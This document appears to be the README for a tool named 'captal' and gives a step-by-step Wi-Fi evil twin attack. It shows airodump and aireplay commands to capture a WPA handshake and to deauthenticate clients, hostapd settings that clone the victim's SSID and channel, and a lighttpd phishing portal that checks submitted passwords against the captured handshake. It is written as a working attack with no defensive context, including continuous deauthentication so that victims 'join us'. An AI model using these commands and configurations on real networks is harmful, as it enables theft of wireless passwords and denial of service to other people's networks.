# Evil Twin AP and WPA Password Phishing

### Handshake Snooping

##### Explore a network

```sh
sudo airodump -M wlan0
```
Save bssid and channel of the victim-AP.

##### Explore the victim-AP

```sh
sudo airodump -M --bssid $BSSID --channel $CHANNEL -w output wlan0
```

##### Snoop the handshake

a) Deauthenticate specific station:

```sh
sudo aireplay -0 5 -a $BSSID -c $STATION
```

b) Deauthenticate all stations:

```sh
sudo aireplay -0 5 -a $BSSID
```

Since the `output-01.cap` has the handshake, we can configure the
captal now!

---

### Configure captal

The following configuration assumes that the **captal** have been
installed with `PREFIX=/usr` instead of default `PREFIX=/usr/local`.

##### Edit `/etc/captal/chkwpa.conf`

```sh
CAP_FILE=/path/to/your/output-*.cap
SSID=your_victim_ssid
```

##### Edit `/etc/captal/hostapd.conf`

```sh
interface=your_roqueAP_interface
ssid=your_victimAP_ssid
channel=your_victimAP_channel
```

##### Edit `/etc/captal/lighttpd.conf`

Uncomment one of the `server.document-root` variable.

### Start captail

##### Run

```sh
sudo /etc/rc.d/captal start
```

##### Logs

```sh
sudo tail -f /var/log/messages /var/log/lighttpd.log
```

### Deauthenticate the clients from Original AP

They need to join us.

a) Deauthenticate specific station:

```sh
sudo aireplay -0 0 -a $BSSID -c $STATION
```

b) Deauthenticate all stations:

```sh
sudo aireplay -0 0 -a $BSSID
```

<!-- vim:sw=2:ts=2:sts=2:et:cc=72:tw=70
End of file. -->
